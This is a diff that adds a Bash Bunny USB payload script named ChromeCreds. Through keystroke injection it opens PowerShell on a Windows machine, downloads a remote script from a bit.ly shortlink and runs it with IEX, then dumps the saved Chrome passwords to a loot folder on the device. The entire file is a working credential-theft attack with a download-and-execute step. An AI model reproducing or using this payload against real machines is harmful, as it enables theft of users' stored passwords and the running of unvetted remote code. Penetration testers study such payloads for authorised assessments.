@@ -1,0 +1,31 @@
+#!/bin/bash
+#
+# Title:         ChromeCreds
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the stored plaintext Chrome passwords from Windows boxes downloading a Powershell script from sekirkity/BrowserGather
+# then stashes them in /root/udisk/loot/ChromeCreds
+#script 
+# Blue...............Running Script
+# Purple.............Got Chrome Creds
+
+
+LED R 200
+LOOTDIR=/root/udisk/loot/ChromeCreds
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID STORAGE
+LED B 200
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nea8tb\'\)\; Get-ChromeCreds \| Out-File \$Bunny\\loot\\ChromeCreds\\Chrome_\$env:computername.txt
+Q ENTER
+LED R B 200
+sync
